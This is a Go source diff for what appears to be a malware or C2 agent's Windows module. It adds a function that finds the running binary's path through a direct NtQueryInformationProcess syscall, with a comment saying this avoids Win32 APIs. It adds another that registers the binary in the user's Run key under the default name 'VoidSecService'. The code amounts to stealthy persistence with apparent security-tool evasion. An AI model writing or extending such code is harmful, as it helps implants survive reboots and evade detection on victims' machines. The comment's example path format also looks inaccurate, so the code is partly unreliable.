@@ -4,6 +4,7 @@ package syscallwin
 
 import (
 	"fmt"
+	"unicode/utf16"
 	"unsafe"
 )
 
@@ -89,4 +90,46 @@ func AddRunOnceKeyPersistence(name string, exePath string) error {
 
 func RemoveRunOnceKeyPersistence(name string) error {
 	return RegDeleteValue(`Software\Microsoft\Windows\CurrentVersion\RunOnce`, name)
+}
+
+// CurrentImagePath returns the running image's NT path (e.g.
+// \??\C:\...\agent.exe) using ProcessImageFileName (class 27), so
+// persistence on-boarding never calls a Win32 API.
+func CurrentImagePath() (string, error) {
+	var buf [0x400]byte
+	outLen := uintptr(len(buf))
+	r1, err := DirectSyscall("NtQueryInformationProcess",
+		GetCurrentProcHandle(),
+		27, // ProcessImageFileName
+		uintptr(unsafe.Pointer(&buf[0])),
+		outLen,
+		uintptr(unsafe.Pointer(&outLen)),
+	)
+	if r1 != 0 || err != nil {
+		return "", fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%x %v", r1, err)
+	}
+	us := (*UnicodeString)(unsafe.Pointer(&buf[0]))
+	if us.Buffer == nil || us.Length == 0 || us.Length > uint16(len(buf)) {
+		return "", fmt.Errorf("invalid image path buffer")
+	}
+	units := make([]uint16, us.Length/2)
+	copy(units, unsafe.Slice((*uint16)(unsafe.Pointer(us.Buffer)), us.Length/2))
+	return string(utf16.Decode(units)), nil
+}
+
+// PersistRunKey registers the current agent image into the current user's
+// Run key through direct registry syscalls. The stored value is the quoted
+// image path so it survives spaces.
+func PersistRunKey(valueName string) error {
+	img, err := CurrentImagePath()
+	if err != nil {
+		return fmt.Errorf("resolve image path: %w", err)
+	}
+	if img == "" {
+		return fmt.Errorf("empty image path")
+	}
+	if valueName == "" {
+		valueName = "VoidSecService"
+	}
+	return AddRunKeyPersistence(valueName, `"`+img+`"`)
 }
